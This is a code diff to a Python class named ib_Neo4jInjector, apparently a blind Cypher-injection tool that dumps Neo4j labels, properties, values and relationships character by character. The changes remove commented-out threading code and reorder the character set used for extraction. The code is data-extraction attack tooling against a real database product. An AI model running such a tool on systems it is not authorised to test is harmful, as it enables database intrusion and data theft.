@@ -771,22 +771,6 @@ class ib_Neo4jInjector:
     def find_label_count(self):
         animation = "|/-\\"
         anim_index = 0
-        # threads = []
-        # count = IntHolder()
-        # stop_event = threading.Event()
-        # for i in range(self.threads):
-        #     threads.append(threading.Thread(target=self.find_label_count_part, args=(count, (MAXSIZE // self.threads), ((MAXSIZE // self.threads) * i), stop_event)))
-        # if (MAXSIZE % self.threads != 0):
-        #     threads.append(threading.Thread(target=self.find_label_count_part, args=(count, (MAXSIZE % self.threads), (MAXSIZE - (MAXSIZE % self.threads)), stop_event)))
-        # start_threads(threads)
-        # print(f"[-] dumping label counts, might take awhile", end='\r', flush=True)
-        # join_threads(threads)
-        # if (count.get() == 0):
-        #     print(colored("It is vulnerable to injection, however Neo4j version is < 5.3, unless labels > 1000, if so increase range OR try out-of-band injection (--out-of-band).", "red"))
-        #     sys.exit()
-        # else:
-        #     print(" " * 70, end='\r')
-        #     return count.get()
         for count_index in range(1000):
             if count_index == 999:
                 print(colored("It is vulnerable to injection, however Neo4j version is < 5.3, unless labels > 1000, if so increase range OR try out-of-band injection (--out-of-band).", "red"))
@@ -843,7 +827,7 @@ class ib_Neo4jInjector:
 
     def dump_labels(self, label_sizes):
         print(f"\n[*] available labels [{len(label_sizes)}]")
-        valid_chars = string.ascii_letters + string.digits + string.punctuation + ' '
+        valid_chars = ':' + ' ' + string.ascii_letters + string.digits + string.punctuation
         labels = []
         animation = "|/-\\"
         anim_index = 0
@@ -932,7 +916,7 @@ class ib_Neo4jInjector:
 
 
     def dump_properties(self, property_sizes_dict):
-        valid_chars = string.ascii_letters + string.digits + string.punctuation + ' '
+        valid_chars = ':' + ' ' + string.ascii_letters + string.digits + string.punctuation
         properties_dict = {}
         animation = "|/-\\"
         anim_index = 0
@@ -1032,7 +1016,7 @@ class ib_Neo4jInjector:
         return value_sizes_dict
 
     def dump_values(self, value_sizes_dict):
-        valid_chars = string.ascii_letters + string.digits + string.punctuation + ' '
+        valid_chars = ':' + ' ' + string.ascii_letters + string.digits + string.punctuation
         values_dict = {}
         animation = "|/-\\"
         anim_index = 0
@@ -1156,7 +1140,7 @@ class ib_Neo4jInjector:
 
     def dump_rel_types(self, rel_type_sizes_dict):
         print(f"\n[*] available relationship [{len(rel_type_sizes_dict)}]")
-        valid_chars = string.ascii_letters + string.digits + string.punctuation + ' '
+        valid_chars = ':' + ' ' + string.ascii_letters + string.digits + string.punctuation
         rel_types = []
         animation = "|/-\\"
         anim_index = 0
@@ -1246,7 +1230,7 @@ class ib_Neo4jInjector:
 
     def dump_rel(self, rel_sizes_dict):
         print(colored(f"\n[!] At this stage, we are unaware of the relationship direction, we have to verify it\n", "yellow"))
-        valid_chars = string.ascii_letters + string.digits + string.punctuation + ' '
+        valid_chars = ':' + ' ' + string.ascii_letters + string.digits + string.punctuation
         rels_dict = {}
         animation = "|/-\\"
         anim_index = 0
@@ -1320,6 +1304,7 @@ class ib_Neo4jInjector:
             print(f"[+] {rel_type}")
             for rel in verified_rels:
                 regex_rel_type = re.findall(r"\[:([^\]]+)\]", rel)[0]
+
                 if regex_rel_type == rel_type:
                     print(f"[++] {rel}")
 
